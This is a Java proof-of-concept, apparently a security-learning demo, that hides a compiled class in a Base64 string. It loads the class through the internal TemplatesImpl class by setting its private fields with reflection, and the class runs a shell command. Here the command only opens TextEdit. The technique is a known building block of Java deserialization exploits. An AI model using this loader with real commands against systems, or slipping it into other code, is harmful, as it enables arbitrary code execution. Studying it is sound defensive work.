package URLClassLoaderDemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.*;
import java.io.*;
import java.lang.reflect.Field;
import javax.xml.transform.*;
import java.util.Base64;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 5:39 下午
 */
public class TemplatesImplLoader {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException {
        String shell = "yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAB5FdmlsT2ZUZW1wbGF0ZXNsbXBsTG9hZGVyLmphdmEMAAcACAcAHAwAHQAeAQApb3BlbiAtYSAvU3lzdGVtL0FwcGxpY2F0aW9ucy9UZXh0RWRpdC5hcHAMAB8AIAEALFVSTENsYXNzTG9hZGVyRGVtby9FdmlsT2ZUZW1wbGF0ZXNsbXBsTG9hZGVyAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADwAEABAADQARAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAFQALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABkACwAAAAQAAQAPAAEAEQAAAAIAEg==";
        byte[] shellCode = Base64.getDecoder().decode(shell);

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = c1.getDeclaredField("_name");
        Field _bytecode = c1.getDeclaredField("_bytecodes");
        Field _tfactory = c1.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, new byte[][]{shellCode});
        _tfactory.set(templates, new TransformerFactoryImpl());

        templates.newTransformer();
    }
}


